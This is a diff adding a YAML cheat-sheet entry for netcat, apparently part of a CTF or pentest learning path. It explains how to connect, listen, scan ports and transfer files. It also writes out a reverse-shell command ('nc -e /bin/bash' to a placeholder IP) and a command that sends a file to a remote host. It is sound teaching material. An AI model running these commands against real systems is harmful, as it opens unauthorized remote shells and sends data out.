@@ -1,0 +1,40 @@
+tool: netcat
+package: openbsd-netcat
+category: utilities
+description: TCP/UDP Swiss army knife — listen, connect, transfer, spawn shells
+when_to_use: Any time you need a raw network connection. Used in almost every CTF and pentest.
+
+commands:
+  - cmd: "nc <ip> <port>"
+    meaning: Connect to a host on a specific port — test if it's open and talk to it
+
+  - cmd: "nc -lvnp <port>"
+    meaning: Listen for an incoming connection on your machine
+    flag: "-lvnp"
+    flag_meaning: Listen mode — l=listen, v=verbose, n=no DNS, p=port
+    combine_with:
+      - cmd: "nc -lvnp 4444"
+        meaning: The classic listener port for catching reverse shells
+
+  - cmd: "nc -e /bin/bash <ip> <port>"
+    meaning: Send a shell to a remote listener — this is a reverse shell
+    flag: "-e"
+    flag_meaning: Execute — runs a program and connects its input/output to the socket
+
+  - cmd: "nc <ip> <port> < file.txt"
+    meaning: Send a file to a remote host over a raw TCP connection
+
+  - cmd: "nc -lvnp <port> > received.txt"
+    meaning: Receive a file from a remote host and save it
+
+  - cmd: "nc -zv <ip> 1-1000"
+    meaning: Port scan a host across a range — quick and dirty alternative to nmap
+    flag: "-z"
+    flag_meaning: Zero I/O mode — just check if ports are open, don't send data
+
+after:
+  - nmap
+  - metasploit
+
+path: networking
+path_step: 3
